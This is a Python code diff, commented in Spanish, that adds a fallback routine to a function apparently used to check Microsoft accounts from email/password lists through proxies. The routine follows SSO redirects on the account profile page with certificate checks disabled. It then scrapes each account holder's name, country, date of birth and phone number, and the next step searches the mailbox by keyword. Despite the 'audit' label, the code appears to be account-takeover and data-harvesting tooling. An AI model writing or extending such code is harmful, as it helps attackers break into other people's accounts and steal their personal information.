@@ -469,6 +469,83 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target
                 print(f"[DEBUG vps_agent] Substrate profile exitoso: {name} | {country}")
         except: pass
         
+        # --- HTML Profile Scraping Fallback ---
+        try:
+            profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
+            if profile_html_res.status_code == 200:
+                html_text = profile_html_res.text
+                
+                # Resolver SSO Bridge (Redirects)
+                redirect_count = 0
+                while redirect_count < 10:
+                    made_request = False
+                    if "<form" in html_text:
+                        form_action = re.search(r'action="([^"]+)"', html_text, re.IGNORECASE)
+                        if form_action:
+                            post_url = form_action.group(1).replace("&#x3a;", ":").replace("&#x2f;", "/")
+                            inputs = re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html_text, re.IGNORECASE)
+                            silent_data = {k: v.replace("&quot;", '"') for k, v in inputs}
+                            try:
+                                profile_html_res = session.post(post_url, data=silent_data, verify=False, timeout=15, allow_redirects=True, headers=session.headers)
+                                html_text = profile_html_res.text; made_request = True
+                            except: pass
+                            redirect_count += 1
+                    if not made_request and "window.location.replace" in html_text:
+                        redir_m = re.search(r'window\.location\.replace\((["\'])(.*?)\1\)', html_text)
+                        if redir_m:
+                            try:
+                                profile_html_res = session.get(redir_m.group(2), verify=False, timeout=15, allow_redirects=True, headers=session.headers)
+                                html_text = profile_html_res.text; made_request = True
+                            except: pass
+                            redirect_count += 1
+                    if not made_request: break
+
+                # Regex Fallbacks
+                try:
+                    import json
+                    area_matches = re.findall(r'var areaConfig = JSON\.stringify\(({.*?})\);', html_text)
+                    for am in area_matches:
+                        area = json.loads(am)
+                        c = area.get("userMarket") or area.get("countryCode")
+                        if c and c != "XZ": country = c
+                        dump = json.dumps(area)
+                        n_m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
+                        if n_m and name == "N/A": 
+                            try: name = n_m.group(1).encode('utf-8').decode('unicode_escape')
+                            except: name = n_m.group(1)
+                        d_m = re.search(r'"(?:BirthDate|dob)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
+                        if d_m and dob == "N/A": dob = d_m.group(1)
+                    cms_matches = re.findall(r'var cmsContent = JSON\.stringify\(({.*?})\);', html_text)
+                    for cm in cms_matches:
+                        dump = json.dumps(json.loads(cm))
+                        if name == "N/A":
+                            n_m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
+                            if n_m and "Full name" not in n_m.group(1): name = n_m.group(1)
+                        if country == "N/A" or country == "XZ":
+                            c_m = re.search(r'"(?:Country|userMarket)"\s*:\s*"([A-Z]{2})"', dump, re.IGNORECASE)
+                            if c_m and c_m.group(1) != "XZ": country = c_m.group(1)
+                        if dob == "N/A":
+                            d_m = re.search(r'"(?:BirthDate|dob)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
+                            if d_m and "Date of birth" not in d_m.group(1): dob = d_m.group(1)
+                except Exception as e: print(f"[DEBUG vps_agent] JSON Ex: {e}")
+
+                if name == "N/A" or not name:
+                    m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                    if not m: m = re.search(r'<span>Full name</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
+                    if m: name = m.group(1).strip()
+                if country == "N/A" or country == "XZ":
+                    m = re.search(r'"(?:Country|CountryOrRegion)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                    if not m: m = re.search(r'Country or region</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
+                    if m: country = m.group(1).strip().upper()
+                if dob == "N/A":
+                    m = re.search(r'"(?:BirthDate|DateOfBirth|dob)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                    if not m: m = re.search(r'Date of birth</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
+                    if m and "Date of birth" not in m.group(1): dob = m.group(1).strip()
+                phone_matches = re.findall(r'"ProofName"\s*:\s*"(\+\d+[^"]+)"', html_text, re.IGNORECASE)
+                if not phone_matches: phone_matches = re.findall(r'"PhoneNumber"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                if phone_matches: phone = phone_matches[0].strip()
+        except: pass
+        
         # PASO 7 - Búsqueda DLP Vía Substrate API
         senders_found = {}
         subject_count = 0
